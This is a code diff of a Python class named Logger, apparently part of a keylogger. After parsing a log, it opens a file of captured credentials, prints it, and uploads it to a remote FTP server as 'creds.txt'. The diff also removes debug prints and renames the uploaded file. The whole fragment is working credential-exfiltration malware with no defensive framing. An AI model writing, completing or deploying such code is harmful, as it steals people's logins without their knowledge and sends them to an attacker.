@@ -25,19 +25,23 @@ class Logger:
             if(not self.analyzer.will_not_parse):
                 done_analyzing = self.analyzer.parse_log_file()
             if done_analyzing:
-                print("6")
                 # send file of credentials thru ftp
                 #file_to_send = fdopen(self.cred_file, 'rb')
-                file_to_send = open(self.cred_file, 'r')
-                print("7")
-                self.session.storbinary('STOR example.txt', file_to_send)
-                print("8")
+                ''' '''
+                print("FILE FOR TRANSFER")
+                file_to_send = open(self.cred_file, 'rb')
+                for line in file_to_send:
+                    print(line)
+                file_to_send.close
+                print("FILE FOR TRANSFER")
+                ''' '''
+                file_to_send = open(self.cred_file, 'rb')
+                code = self.session.storbinary('STOR creds.txt',
+                                                file_to_send) # returns response code
+                print(code)
                 self.session.quit()
-                print("9")
                 file_to_send.close()
-                print("10")
                 return False
-                print("11")
         else:
             logging.info(log_str)
     
